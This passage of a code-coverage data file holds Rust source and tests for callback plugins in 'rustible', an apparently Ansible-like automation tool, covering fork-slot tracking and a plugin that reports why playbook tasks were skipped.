callback.host_stats.read();\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.unreachable, 1);\n\n        let states = callback.host_states.read();\n        assert!(matches!(states.get(\"host1\"), Some(HostState::Unreachable)));\n\n        assert!(callback.has_failures());\n    }\n\n    #[tokio::test]\n    async fn test_fork_slot_allocation() {\n        let callback = ForkedCallbackBuilder::new()\n            .forks(2)\n            .terminal_ui(false)\n            .build();\n\n        callback.on_playbook_start(\"test\").await;\n\n        // Allocate first slot\n        let slot1 = callback.allocate_fork_slot(\"host1\");\n        assert_eq!(slot1, Some(0));\n\n        // Allocate second slot\n        let slot2 = callback.allocate_fork_slot(\"host2\");\n        assert_eq!(slot2, Some(1));\n\n        // No more slots available\n        let slot3 = callback.allocate_fork_slot(\"host3\");\n        assert_eq!(slot3, None);\n\n        // Release a slot\n        callback.release_fork_slot(\"host1\");\n\n        // Now we can allocate again\n        let slot4 = callback.allocate_fork_slot(\"host3\");\n        assert_eq!(slot4, Some(0));\n    }\n\n    #[test]\n    fn test_default_trait() {\n        let callback = ForkedCallback::default();\n        assert_eq!(callback.forks(), 5);\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let callback1 = ForkedCallback::new(5);\n        let callback2 = callback1.clone();\n\n        assert!(Arc::ptr_eq(\u0026callback1.host_stats, \u0026callback2.host_stats));\n        assert!(Arc::ptr_eq(\u0026callback1.host_states, \u0026callback2.host_states));\n        assert!(Arc::ptr_eq(\u0026callback1.fork_slots, \u0026callback2.fork_slots));\n    }\n\n    #[test]\n    fn test_host_state_equality() {\n        assert_eq!(HostState::Pending, HostState::Pending);\n        assert_eq!(\n            HostState::Running { fork_slot: 0 },\n            HostState::Running { fork_slot: 0 }\n        );\n        assert_ne!(\n            HostState::Running { fork_slot: 0 },\n            HostState::Running { fork_slot: 1 }\n        );\n        assert_ne!(HostState::Pending, HostState::Completed);\n    }\n\n    #[test]\n    fn test_forked_config_default() {\n        let config = ForkedConfig::default();\n        assert_eq!(config.forks, 5);\n        assert!(config.show_host_progress);\n        assert!(config.show_summary);\n    }\n}\n","traces":[{"line":94,"address":[26427328],"length":1,"stats":{"Line":1}},{"line":119,"address":[26440720],"length":1,"stats":{"Line":1}},{"line":122,"address":[26440734],"length":1,"stats":{"Line":1}},{"line":191,"address":[26438976,26439227,26439252],"length":1,"stats":{"Line":1}},{"line":193,"address":[26439020],"length":1,"stats":{"Line":1}},{"line":196,"address":[26439116],"length":1,"stats":{"Line":1}},{"line":201,"address":[26428256,26429678],"length":1,"stats":{"Line":1}},{"line":202,"address":[26428278,26428370],"length":1,"stats":{"Line":2}},{"line":204,"address":[26428378],"length":1,"stats":{"Line":1}},{"line":205,"address":[26428455,26428518],"length":1,"stats":{"Line":2}},{"line":206,"address":[26428566,26428626],"length":1,"stats":{"Line":2}},{"line":207,"address":[26428679,26428739],"length":1,"stats":{"Line":2}},{"line":208,"address":[26428843,26428791],"length":1,"stats":{"Line":2}},{"line":209,"address":[26428933,26428881],"length":1,"stats":{"Line":2}},{"line":210,"address":[26429044,26428968],"length":1,"stats":{"Line":2}},{"line":211,"address":[26429079,26429155],"length":1,"stats":{"Line":2}},{"line":212,"address":[26429184,26429238],"length":1,"stats":{"Line":2}},{"line":213,"address":[26429372,26429315],"length":1,"stats":{"Line":2}},{"line":214,"address":[26429455,26429510],"length":1,"stats":{"Line":2}},{"line":219,"address":[26429849,26429843,26429728],"length":1,"stats":{"Line":1}},{"line":220,"address":[26429737,26429816],"length":1,"stats":{"Line":2}},{"line":224,"address":[26439264],"length":1,"stats":{"Line":1}},{"line":225,"address":[26439269],"length":1,"stats":{"Line":1}},{"line":229,"address":[26434920,26434256,26434914],"length":1,"stats":{"Line":1}},{"line":230,"address":[26434297],"length":1,"stats":{"Line":1}},{"line":233,"address":[26434331,26434385],"length":1,"stats":{"Line":2}},{"line":234,"address":[26434643],"length":1,"stats":{"Line":1}},{"line":235,"address":[26434702,26434774],"length":1,"stats":{"Line":1}},{"line":236,"address":[26434881],"length":1,"stats":{"Line":1}},{"line":237,"address":[26434885],"length":1,"stats":{"Line":1}},{"line":242,"address":[26434655],"length":1,"stats":{"Line":1}},{"line":246,"address":[26434108,26434230,26433456],"length":1,"stats":{"Line":1}},{"line":247,"address":[26433497],"length":1,"stats":{"Line":1}},{"line":249,"address":[26433531,26433585],"length":1,"stats":{"Line":2}},{"line":250,"address":[26433826,26433767],"length":1,"stats":{"Line":2}},{"line":251,"address":[26433907],"length":1,"stats":{"Line":1}},{"line":252,"address":[26433989],"length":1,"stats":{"Line":0}},{"line":254,"address":[26434023,26434119],"length":1,"stats":{"Line":1}},{"line":255,"address":[26434221],"length":1,"stats":{"Line":1}},{"line":262,"address":[26437668,26436672,26437662],"length":1,"stats":{"Line":0}},{"line":263,"address":[26437081,26436736],"length":1,"stats":{"Line":0}},{"line":264,"address":[26437089,26436817,26436908],"length":1,"stats":{"Line":0}},{"line":266,"address":[26436844,26436779],"length":1,"stats":{"Line":0}},{"line":268,"address":[25574640,25574661],"length":1,"stats":{"Line":0}},{"line":272,"address":[26437341],"length":1,"stats":{"Line":0}},{"line":273,"address":[26437365],"length":1,"stats":{"Line":0}},{"line":274,"address":[26437483],"length":1,"stats":{"Line":0}},{"line":275,"address":[26437525],"length":1,"stats":{"Line":0}},{"line":276,"address":[26437557],"length":1,"stats":{"Line":0}},{"line":277,"address":[26437611],"length":1,"stats":{"Line":0}},{"line":281,"address":[26438951,26438272,26438945],"length":1,"stats":{"Line":0}},{"line":282,"address":[26438361],"length":1,"stats":{"Line":0}},{"line":284,"address":[26438401,26438464],"length":1,"stats":{"Line":0}},{"line":285,"address":[26438714,26438646],"length":1,"stats":{"Line":0}},{"line":286,"address":[26438795],"length":1,"stats":{"Line":0}},{"line":287,"address":[26438855],"length":1,"stats":{"Line":0}},{"line":288,"address":[26438901],"length":1,"stats":{"Line":0}},{"line":296,"address":[26432112,26433438,26433432],"length":1,"stats":{"Line":0}},{"line":297,"address":[26432336,26432243,26432465],"length":1,"stats":{"Line":0}},{"line":299,"address":[26432158],"length":1,"stats":{"Line":0}},{"line":300,"address":[26432224,26432287],"length":1,"stats":{"Line":0}},{"line":301,"address":[26432382,26432324],"length":1,"stats":{"Line":0}},{"line":303,"address":[26432884,26432816],"length":1,"stats":{"Line":0}},{"line":304,"address":[26433193,26433113],"length":1,"stats":{"Line":0}},{"line":308,"address":[26433368],"length":1,"stats":{"Line":0}},{"line":313,"address":[26436643,26434944,26436649],"length":1,"stats":{"Line":0}},{"line":314,"address":[26434964],"length":1,"stats":{"Line":0}},{"line":315,"address":[26435000],"length":1,"stats":{"Line":0}},{"line":316,"address":[26435031],"length":1,"stats":{"Line":0}},{"line":318,"address":[26435065,26435182],"length":1,"stats":{"Line":0}},{"line":320,"address":[25574576,25574586],"length":1,"stats":{"Line":0}},{"line":322,"address":[26435195,26435275],"length":1,"stats":{"Line":0}},{"line":324,"address":[25574608,25574618],"length":1,"stats":{"Line":0}},{"line":327,"address":[26435625,26435693,26435549],"length":1,"stats":{"Line":0}},{"line":340,"address":[26438254,26437728,26438248],"length":1,"stats":{"Line":1}},{"line":341,"address":[26437929,26437877],"length":1,"stats":{"Line":1}},{"line":343,"address":[26437804],"length":1,"stats":{"Line":1}},{"line":344,"address":[26437858],"length":1,"stats":{"Line":1}},{"line":350,"address":[26432080,26432086,26429872],"length":1,"stats":{"Line":0}},{"line":351,"address":[26429947],"length":1,"stats":{"Line":0}},{"line":352,"address":[26430044],"length":1,"stats":{"Line":0}},{"line":353,"address":[26430144,26430026],"length":1,"stats":{"Line":0}},{"line":354,"address":[26430118],"length":1,"stats":{"Line":0}},{"line":355,"address":[26430092],"length":1,"stats":{"Line":0}},{"line":356,"address":[26430002],"length":1,"stats":{"Line":0}},{"line":359,"address":[26430163],"length":1,"stats":{"Line":0}},{"line":360,"address":[26430270,26430443],"length":1,"stats":{"Line":0}},{"line":361,"address":[26430338,26430474],"length":1,"stats":{"Line":0}},{"line":362,"address":[26430472,26430304],"length":1,"stats":{"Line":0}},{"line":363,"address":[26430236,26430413],"length":1,"stats":{"Line":0}},{"line":364,"address":[26430202,26430503],"length":1,"stats":{"Line":0}},{"line":367,"address":[26431000,26430836,26430902,26430672,26431230,26431164,26430574,26431308,26430738,26431066],"length":1,"stats":{"Line":0}},{"line":369,"address":[26430420,26430625,26430557],"length":1,"stats":{"Line":0}},{"line":370,"address":[26430721,26430789,26430649],"length":1,"stats":{"Line":0}},{"line":371,"address":[26430813,26430953,26430885],"length":1,"stats":{"Line":0}},{"line":372,"address":[26431049,26430977,26431117],"length":1,"stats":{"Line":0}},{"line":373,"address":[26431141,26431281,26431213],"length":1,"stats":{"Line":0}},{"line":379,"address":[26440912],"length":1,"stats":{"Line":1}},{"line":380,"address":[26440920],"length":1,"stats":{"Line":1}},{"line":385,"address":[26440492,26440498,26439600],"length":1,"stats":{"Line":1}},{"line":387,"address":[26439635],"length":1,"stats":{"Line":1}},{"line":388,"address":[26439645,26439708],"length":1,"stats":{"Line":2}},{"line":389,"address":[26439716,26439779],"length":1,"stats":{"Line":2}},{"line":390,"address":[26439850,26439787],"length":1,"stats":{"Line":2}},{"line":391,"address":[26439858,26439921],"length":1,"stats":{"Line":2}},{"line":392,"address":[26439992,26439929],"length":1,"stats":{"Line":2}},{"line":393,"address":[26440000,26440063],"length":1,"stats":{"Line":2}},{"line":394,"address":[26440134,26440071],"length":1,"stats":{"Line":2}},{"line":395,"address":[26440205,26440142],"length":1,"stats":{"Line":2}},{"line":396,"address":[26440276,26440213],"length":1,"stats":{"Line":2}},{"line":397,"address":[26440284],"length":1,"stats":{"Line":1}},{"line":405,"address":[25569085,25571561,25569055,25568959,25571457,25568928,25571441],"length":1,"stats":{"Line":4}},{"line":406,"address":[25569029,25569162],"length":1,"stats":{"Line":2}},{"line":407,"address":[25571503,25569369,25569584,25569652,25569342],"length":1,"stats":{"Line":1}},{"line":410,"address":[25569789],"length":1,"stats":{"Line":1}},{"line":411,"address":[25569955],"length":1,"stats":{"Line":1}},{"line":412,"address":[25570109],"length":1,"stats":{"Line":1}},{"line":415,"address":[25570253],"length":1,"stats":{"Line":1}},{"line":416,"address":[25570298],"length":1,"stats":{"Line":1}},{"line":419,"address":[25570343],"length":1,"stats":{"Line":1}},{"line":420,"address":[25570404,25570461],"length":1,"stats":{"Line":2}},{"line":421,"address":[25570476],"length":1,"stats":{"Line":1}},{"line":422,"address":[25570576,25571471],"length":1,"stats":{"Line":2}},{"line":426,"address":[25570657,25570728],"length":1,"stats":{"Line":2}},{"line":431,"address":[25571216,25571008],"length":1,"stats":{"Line":2}},{"line":438,"address":[25564300,25560218,25560111,25560080,25561022,25560248,25563857],"length":1,"stats":{"Line":0}},{"line":439,"address":[25560199,25560295],"length":1,"stats":{"Line":0}},{"line":440,"address":[25560408,25560341],"length":1,"stats":{"Line":0}},{"line":441,"address":[25560518,25560454],"length":1,"stats":{"Line":0}},{"line":444,"address":[25560668,25560804],"length":1,"stats":{"Line":0}},{"line":445,"address":[25560882,25560976],"length":1,"stats":{"Line":0}},{"line":449,"address":[25561028],"length":1,"stats":{"Line":0}},{"line":450,"address":[25561356],"length":1,"stats":{"Line":0}},{"line":451,"address":[25561581],"length":1,"stats":{"Line":0}},{"line":454,"address":[25561983,25561917],"length":1,"stats":{"Line":0}},{"line":455,"address":[25562029,25562109],"length":1,"stats":{"Line":0}},{"line":457,"address":[25562116,25562314],"length":1,"stats":{"Line":0}},{"line":458,"address":[25563889,25562385],"length":1,"stats":{"Line":0}},{"line":459,"address":[25563978],"length":1,"stats":{"Line":0}},{"line":460,"address":[25564060],"length":1,"stats":{"Line":0}},{"line":465,"address":[25562418],"length":1,"stats":{"Line":0}},{"line":466,"address":[25562478,25562555],"length":1,"stats":{"Line":0}},{"line":467,"address":[25562570],"length":1,"stats":{"Line":0}},{"line":468,"address":[25562699,25562605],"length":1,"stats":{"Line":0}},{"line":470,"address":[25562574,25562636],"length":1,"stats":{"Line":0}},{"line":473,"address":[25562772,25562673],"length":1,"stats":{"Line":0}},{"line":481,"address":[25562517,25563181],"length":1,"stats":{"Line":0}},{"line":482,"address":[25563214],"length":1,"stats":{"Line":0}},{"line":483,"address":[25563609],"length":1,"stats":{"Line":0}},{"line":494,"address":[25554601,25555595,25555611,25555757,25554480,25554508,25554574],"length":1,"stats":{"Line":4}},{"line":496,"address":[25554558,25554645],"length":1,"stats":{"Line":2}},{"line":497,"address":[25554740,25554682],"length":1,"stats":{"Line":2}},{"line":499,"address":[25554853,25554777],"length":1,"stats":{"Line":2}},{"line":500,"address":[25554966,25555622],"length":1,"stats":{"Line":2}},{"line":501,"address":[25555692],"length":1,"stats":{"Line":1}},{"line":505,"address":[25554986],"length":1,"stats":{"Line":1}},{"line":506,"address":[25555033],"length":1,"stats":{"Line":1}},{"line":508,"address":[25555236],"length":1,"stats":{"Line":1}},{"line":517,"address":[25553763,25553664,25554444,25553790,25553692,25554127,25554324],"length":1,"stats":{"Line":0}},{"line":519,"address":[25553834,25553747],"length":1,"stats":{"Line":0}},{"line":520,"address":[25554439,25553919,25553868],"length":1,"stats":{"Line":0}},{"line":521,"address":[25554091,25554143],"length":1,"stats":{"Line":0}},{"line":522,"address":[25554206],"length":1,"stats":{"Line":0}},{"line":524,"address":[25554334,25554239],"length":1,"stats":{"Line":0}},{"line":525,"address":[25554435],"length":1,"stats":{"Line":0}},{"line":530,"address":[25560041,25555966,25555936,25555792,25555823,25557065,25558218],"length":1,"stats":{"Line":4}},{"line":533,"address":[25555917,25556013],"length":1,"stats":{"Line":2}},{"line":534,"address":[25556122,25556059],"length":1,"stats":{"Line":2}},{"line":535,"address":[25556286,25556313,25560009,25556411,25556479],"length":1,"stats":{"Line":1}},{"line":537,"address":[25556613],"length":1,"stats":{"Line":1}},{"line":538,"address":[25556666,25557071],"length":1,"stats":{"Line":0}},{"line":540,"address":[25556619,25556684],"length":1,"stats":{"Line":2}},{"line":551,"address":[25557084],"length":1,"stats":{"Line":1}},{"line":552,"address":[25557165,25557252],"length":1,"stats":{"Line":2}},{"line":553,"address":[25557314,25557352],"length":1,"stats":{"Line":2}},{"line":559,"address":[25557425],"length":1,"stats":{"Line":1}},{"line":560,"address":[25557498,25557924,25557569],"length":1,"stats":{"Line":3}},{"line":561,"address":[25557775,25557671,25557724],"length":1,"stats":{"Line":2}},{"line":562,"address":[25557868],"length":1,"stats":{"Line":1}},{"line":567,"address":[25557937,25558007],"length":1,"stats":{"Line":1}},{"line":568,"address":[25558242,25558021],"length":1,"stats":{"Line":0}},{"line":569,"address":[25558288,25558351],"length":1,"stats":{"Line":0}},{"line":570,"address":[25558690,25558633],"length":1,"stats":{"Line":0}},{"line":571,"address":[25558871,25558815],"length":1,"stats":{"Line":0}},{"line":572,"address":[25558919,25558974],"length":1,"stats":{"Line":0}},{"line":573,"address":[25559034],"length":1,"stats":{"Line":0}},{"line":574,"address":[25559168,25559088],"length":1,"stats":{"Line":0}},{"line":576,"address":[25559057],"length":1,"stats":{"Line":0}},{"line":577,"address":[25559299],"length":1,"stats":{"Line":0}},{"line":578,"address":[25559352,25559442],"length":1,"stats":{"Line":0}},{"line":579,"address":[25559450],"length":1,"stats":{"Line":0}},{"line":580,"address":[25559522,25559610],"length":1,"stats":{"Line":0}},{"line":581,"address":[25559754,25559812,25559941,25559702],"length":1,"stats":{"Line":0}},{"line":588,"address":[25558051,25557951],"length":1,"stats":{"Line":2}},{"line":593,"address":[25568196,25564498,25564468,25565122,25564367,25564336],"length":1,"stats":{"Line":4}},{"line":594,"address":[25564429],"length":1,"stats":{"Line":1}},{"line":598,"address":[25564449,25564545],"length":1,"stats":{"Line":2}},{"line":599,"address":[25564654,25564591],"length":1,"stats":{"Line":2}},{"line":601,"address":[25564751,25565289],"length":1,"stats":{"Line":1}},{"line":602,"address":[25565286,25565294,25564795],"length":1,"stats":{"Line":0}},{"line":603,"address":[25564772],"length":1,"stats":{"Line":1}},{"line":604,"address":[25564831,25564905,25564927],"length":1,"stats":{"Line":2}},{"line":605,"address":[25564955,25564908],"length":1,"stats":{"Line":2}},{"line":606,"address":[25565204,25565245,25564860],"length":1,"stats":{"Line":3}},{"line":607,"address":[25565242,25565250,25565165],"length":1,"stats":{"Line":2}},{"line":609,"address":[25565136,25565201,25565206],"length":1,"stats":{"Line":2}},{"line":612,"address":[25565323,25565100],"length":1,"stats":{"Line":1}},{"line":613,"address":[25565416],"length":1,"stats":{"Line":1}},{"line":618,"address":[25565446],"length":1,"stats":{"Line":1}},{"line":619,"address":[25565567,25565519],"length":1,"stats":{"Line":1}},{"line":620,"address":[25565555],"length":1,"stats":{"Line":0}},{"line":621,"address":[25565581,25565540],"length":1,"stats":{"Line":2}},{"line":622,"address":[25565569],"length":1,"stats":{"Line":1}},{"line":624,"address":[25565583],"length":1,"stats":{"Line":1}},{"line":628,"address":[25565674,25565603],"length":1,"stats":{"Line":2}},{"line":629,"address":[25565752],"length":1,"stats":{"Line":1}},{"line":630,"address":[25565781],"length":1,"stats":{"Line":1}},{"line":636,"address":[25565872],"length":1,"stats":{"Line":1}},{"line":637,"address":[25565909],"length":1,"stats":{"Line":0}},{"line":638,"address":[25567893,25567202],"length":1,"stats":{"Line":0}},{"line":639,"address":[25567900,25567187],"length":1,"stats":{"Line":0}},{"line":640,"address":[25567244,25567309],"length":1,"stats":{"Line":0}},{"line":643,"address":[25567287,25567530,25567434],"length":1,"stats":{"Line":0}},{"line":644,"address":[25567804,25567668],"length":1,"stats":{"Line":0}},{"line":646,"address":[25567715,25567637],"length":1,"stats":{"Line":0}},{"line":649,"address":[25567617,25568038],"length":1,"stats":{"Line":0}},{"line":652,"address":[25565886],"length":1,"stats":{"Line":1}},{"line":653,"address":[25565954,25566663],"length":1,"stats":{"Line":0}},{"line":654,"address":[25566670,25565939],"length":1,"stats":{"Line":1}},{"line":655,"address":[25566061,25565996],"length":1,"stats":{"Line":2}},{"line":658,"address":[25566039,25566294,25566192],"length":1,"stats":{"Line":1}},{"line":659,"address":[25566574,25566438],"length":1,"stats":{"Line":2}},{"line":661,"address":[25566407,25566485],"length":1,"stats":{"Line":2}},{"line":664,"address":[25566973],"length":1,"stats":{"Line":1}},{"line":671,"address":[25568135,25567159],"length":1,"stats":{"Line":2}},{"line":674,"address":[25568150],"length":1,"stats":{"Line":1}},{"line":678,"address":[25572068,25571627,25572052,25571699,25571725,25571600],"length":1,"stats":{"Line":0}},{"line":679,"address":[25571768,25571671],"length":1,"stats":{"Line":0}},{"line":683,"address":[25568268,25568326,25568868,25568892,25568453,25568884,25568240],"length":1,"stats":{"Line":0}},{"line":684,"address":[25568318],"length":1,"stats":{"Line":0}},{"line":685,"address":[25568890,25568412],"length":1,"stats":{"Line":0}},{"line":687,"address":[25568678,25568515,25568581],"length":1,"stats":{"Line":0}},{"line":704,"address":[25572206,25573579,25572112,25573595,25572233,25572140],"length":1,"stats":{"Line":4}},{"line":706,"address":[25572190,25572301],"length":1,"stats":{"Line":2}},{"line":708,"address":[25572362,25572328],"length":1,"stats":{"Line":1}},{"line":712,"address":[25572425],"length":1,"stats":{"Line":1}},{"line":713,"address":[25572486,25572543],"length":1,"stats":{"Line":2}},{"line":714,"address":[25572674,25572631],"length":1,"stats":{"Line":1}},{"line":718,"address":[25572699],"length":1,"stats":{"Line":1}},{"line":721,"address":[25572843],"length":1,"stats":{"Line":1}},{"line":724,"address":[25573097],"length":1,"stats":{"Line":1}},{"line":743,"address":[26439424],"length":1,"stats":{"Line":1}},{"line":745,"address":[26439437],"length":1,"stats":{"Line":1}},{"line":751,"address":[26439552],"length":1,"stats":{"Line":1}},{"line":752,"address":[26439569],"length":1,"stats":{"Line":1}},{"line":753,"address":[26439573],"length":1,"stats":{"Line":1}},{"line":758,"address":[26439280],"length":1,"stats":{"Line":1}},{"line":759,"address":[26439303],"length":1,"stats":{"Line":1}},{"line":760,"address":[26439308],"length":1,"stats":{"Line":1}},{"line":765,"address":[26439376],"length":1,"stats":{"Line":0}},{"line":766,"address":[26439399],"length":1,"stats":{"Line":0}},{"line":767,"address":[26439404],"length":1,"stats":{"Line":0}},{"line":772,"address":[26439328],"length":1,"stats":{"Line":0}},{"line":773,"address":[26439351],"length":1,"stats":{"Line":0}},{"line":774,"address":[26439356],"length":1,"stats":{"Line":0}},{"line":779,"address":[26439488],"length":1,"stats":{"Line":1}},{"line":780,"address":[26439501],"length":1,"stats":{"Line":1}},{"line":785,"address":[26423312],"length":1,"stats":{"Line":0}},{"line":786,"address":[26423320],"length":1,"stats":{"Line":0}}],"covered":144,"coverable":269},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","full_skip.rs"],"content":"//! Full Skip Callback Plugin for Rustible.\n//!\n//! This callback plugin provides detailed information about why tasks were skipped,\n//! including the exact `when` condition that evaluated to false. This is invaluable\n//! for debugging conditional logic in playbooks.\n//!\n//! # Features\n//!\n//! - Shows the exact reason each task was skipped\n//! - Displays the `when` condition that failed evaluation\n//! - Groups skipped tasks by condition for pattern analysis\n//! - Provides a summary of all skip patterns at playbook end\n//! - Complements the `skippy` callback with deeper skip analysis\n//!\n//! # Example Output\n//!\n//! ```text\n//! SKIPPED: webserver1 | Install nginx\n//!   Condition: ansible_os_family == 'Debian'\n//!   Reason: Condition evaluated to false (ansible_os_family = 'RedHat')\n//!\n//! SKIPPED: dbserver1 | Configure PostgreSQL\n//!   Condition: postgresql_enabled is defined and postgresql_enabled\n//!   Reason: Variable 'postgresql_enabled' is not defined\n//!\n//! === SKIP SUMMARY ===\n//! Total skipped: 5 tasks across 3 hosts\n//!\n//! Skip Patterns:\n//!   ansible_os_family == 'Debian'  (3 occurrences)\n//!     - Install nginx (webserver1, webserver2, webserver3)\n//!   postgresql_enabled is defined  (2 occurrences)\n//!     - Configure PostgreSQL (dbserver1, dbserver2)\n//! ```\n\nuse std::collections::HashMap;\nuse std::time::Instant;\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse parking_lot::RwLock;\nuse serde::{Deserialize, Serialize};\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Configuration for the full skip callback\n#[derive(Debug, Clone)]\npub struct FullSkipConfig {\n    /// Whether to show detailed variable values in skip reasons\n    pub show_variable_values: bool,\n    /// Whether to show per-task skip output immediately (vs only in summary)\n    pub show_inline: bool,\n    /// Whether to show the summary at playbook end\n    pub show_summary: bool,\n    /// Whether to group skips by condition in the summary\n    pub group_by_condition: bool,\n    /// Maximum number of hosts to show per condition in summary\n    pub max_hosts_per_condition: usize,\n    /// Whether to show the original when condition expression\n    pub show_condition_expression: bool,\n    /// Verbosity level (0=minimal, 1=normal, 2=verbose)\n    pub verbosity: u8,\n}\n\nimpl Default for FullSkipConfig {\n    fn default() -\u003e Self {\n        Self {\n            show_variable_values: true,\n            show_inline: true,\n            show_summary: true,\n            group_by_condition: true,\n            max_hosts_per_condition: 5,\n            show_condition_expression: true,\n            verbosity: 1,\n        }\n    }\n}\n\n/// Information about a single skipped task\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct SkippedTask {\n    /// Task name\n    pub task_name: String,\n    /// Host the task was skipped on\n    pub host: String,\n    /// The when condition that caused the skip (if available)\n    pub when_condition: Option\u003cString\u003e,\n    /// Human-readable reason for the skip\n    pub skip_reason: String,\n    /// Relevant variable values at time of skip\n    pub variable_context: HashMap\u003cString, String\u003e,\n    /// When the skip occurred\n    #[serde(skip)]\n    pub timestamp: Option\u003cInstant\u003e,\n    /// Execution order\n    pub order: u64,\n}\n\nimpl SkippedTask {\n    /// Create a new skipped task entry\n    pub fn new(task_name: String, host: String, skip_reason: String, order: u64) -\u003e Self {\n        Self {\n            task_name,\n            host,\n            when_condition: None,\n            skip_reason,\n            variable_context: HashMap::new(),\n            timestamp: Some(Instant::now()),\n            order,\n        }\n    }\n\n    /// Set the when condition\n    pub fn with_condition(mut self, condition: String) -\u003e Self {\n        self.when_condition = Some(condition);\n        self\n    }\n\n    /// Add a variable to the context\n    pub fn with_variable(mut self, name: String, value: String) -\u003e Self {\n        self.variable_context.insert(name, value);\n        self\n    }\n\n    /// Extract the primary condition from the skip reason\n    pub fn extract_condition(\u0026self) -\u003e String {\n        self.when_condition.clone().unwrap_or_else(|| {\n            // Try to extract condition from the skip reason message\n            if let Some(start) = self.skip_reason.find(\"condition '\") {\n                if let Some(end) = self.skip_reason[start..].find(\"' was false\") {\n                    return self.skip_reason[start + 11..start + end].to_string();\n                }\n            }\n            // Fallback to the raw message\n            self.skip_reason.clone()\n        })\n    }\n}\n\n/// Statistics tracked per host\n#[derive(Debug, Clone, Default)]\npub struct HostSkipStats {\n    /// Total tasks on this host\n    pub total_tasks: u32,\n    /// Skipped tasks on this host\n    pub skipped_tasks: u32,\n    /// Conditions that caused skips\n    pub skip_conditions: HashMap\u003cString, u32\u003e,\n}\n\n/// Aggregated skip pattern information\n#[derive(Debug, Clone)]\npub struct SkipPattern {\n    /// The condition that caused skips\n    pub condition: String,\n    /// Number of occurrences\n    pub count: usize,\n    /// Tasks that were skipped due to this condition\n    pub tasks: Vec\u003c(String, String)\u003e, // (task_name, host)\n}\n\n/// Full Skip Callback Plugin\n///\n/// Provides comprehensive information about skipped tasks, including\n/// the exact conditions that caused tasks to be skipped. This is\n/// essential for debugging conditional logic in complex playbooks.\n#[derive(Debug)]\npub struct FullSkipCallback {\n    /// Configuration\n    config: FullSkipConfig,\n    /// All skipped tasks\n    skipped_tasks: RwLock\u003cVec\u003cSkippedTask\u003e\u003e,\n    /// Per-host statistics\n    host_stats: RwLock\u003cHashMap\u003cString, HostSkipStats\u003e\u003e,\n    /// Playbook start time\n    playbook_start: RwLock\u003cOption\u003cInstant\u003e\u003e,\n    /// Current playbook name\n    current_playbook: RwLock\u003cOption\u003cString\u003e\u003e,\n    /// Task counter for ordering\n    task_counter: std::sync::atomic::AtomicU64,\n    /// Total tasks executed\n    total_tasks: std::sync::atomic::AtomicU64,\n}\n\nimpl FullSkipCallback {\n    /// Create a new full skip callback with default configuration\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self::with_config(FullSkipConfig::default())\n    }\n\n    /// Create a new full skip callback with custom configuration\n    #[must_use]\n    pub fn with_config(config: FullSkipConfig) -\u003e Self {\n        Self {\n            config,\n            skipped_tasks: RwLock::new(Vec::new()),\n            host_stats: RwLock::new(HashMap::new()),\n            playbook_start: RwLock::new(None),\n            current_playbook: RwLock::new(None),\n            task_counter: std::sync::atomic::AtomicU64::new(0),\n            total_tasks: std::sync::atomic::AtomicU64::new(0),\n        }\n    }\n\n    /// Reset all tracked data\n    pub fn reset(\u0026self) {\n        self.skipped_tasks.write().clear();\n        self.host_stats.write().clear();\n        *self.playbook_start.write() = None;\n        *self.current_playbook.write() = None;\n        self.task_counter\n            .store(0, std::sync::atomic::Ordering::SeqCst);\n        self.total_tasks\n            .store(0, std::sync::atomic::Ordering::SeqCst);\n    }\n\n    /// Get all skipped tasks\n    pub fn get_skipped_tasks(\u0026self) -\u003e Vec\u003cSkippedTask\u003e {\n        self.skipped_tasks.read().clone()\n    }\n\n    /// Get the count of skipped tasks\n    pub fn skip_count(\u0026self) -\u003e usize {\n        self.skipped_tasks.read().len()\n    }\n\n    /// Get the total task count\n    pub fn total_count(\u0026self) -\u003e u64 {\n        self.total_tasks.load(std::sync::atomic::Ordering::SeqCst)\n    }\n\n    /// Calculate skip percentage\n    pub fn skip_percentage(\u0026self) -\u003e f64 {\n        let total = self.total_count();\n        if total == 0 {\n            return 0.0;\n        }\n        (self.skip_count() as f64 / total as f64) * 100.0\n    }\n\n    /// Get aggregated skip patterns\n    pub fn get_skip_patterns(\u0026self) -\u003e Vec\u003cSkipPattern\u003e {\n        let skipped = self.skipped_tasks.read();\n        let mut patterns: HashMap\u003cString, Vec\u003c(String, String)\u003e\u003e = HashMap::new();\n\n        for task in skipped.iter() {\n            let condition = task.extract_condition();\n            patterns\n                .entry(condition)\n                .or_default()\n                .push((task.task_name.clone(), task.host.clone()));\n        }\n\n        let mut result: Vec\u003cSkipPattern\u003e = patterns\n            .into_iter()\n            .map(|(condition, tasks)| SkipPattern {\n                count: tasks.len(),\n                condition,\n                tasks,\n            })\n            .collect();\n\n        // Sort by count descending\n        result.sort_by(|a, b| b.count.cmp(\u0026a.count));\n        result\n    }\n\n    /// Get hosts affected by skips\n    pub fn get_affected_hosts(\u0026self) -\u003e Vec\u003cString\u003e {\n        let stats = self.host_stats.read();\n        stats\n            .iter()\n            .filter(|(_, s)| s.skipped_tasks \u003e 0)\n            .map(|(h, _)| h.clone())\n            .collect()\n    }\n\n    /// Parse the skip reason to extract condition and details\n    fn parse_skip_reason(message: \u0026str) -\u003e (Option\u003cString\u003e, String) {\n        // Common skip message patterns:\n        // \"Skipped: condition 'X' was false\"\n        // \"conditional check failed: X\"\n        // \"when condition evaluated to false\"\n\n        if let Some(start) = message.find(\"condition '\") {\n            if let Some(end) = message[start + 11..].find('\\'') {\n                let condition = message[start + 11..start + 11 + end].to_string();\n                let reason = format!(\"Condition '{}' evaluated to false\", condition);\n                return (Some(condition), reason);\n            }\n        }\n\n        if message.starts_with(\"Skipped: \") {\n            let reason = message[9..].to_string();\n            return (None, reason);\n        }\n\n        (None, message.to_string())\n    }\n\n    /// Format a single skipped task for inline output\n    fn format_skip_inline(\u0026self, task: \u0026SkippedTask) -\u003e String {\n        let mut output = format!(\n            \"{}: {} | {}\",\n            \"SKIPPED\".cyan().bold(),\n            task.host.bright_white().bold(),\n            task.task_name.yellow()\n        );\n\n        if self.config.show_condition_expression {\n            if let Some(ref condition) = task.when_condition {\n                output.push_str(\u0026format!(\n                    \"\\n  {}: {}\",\n                    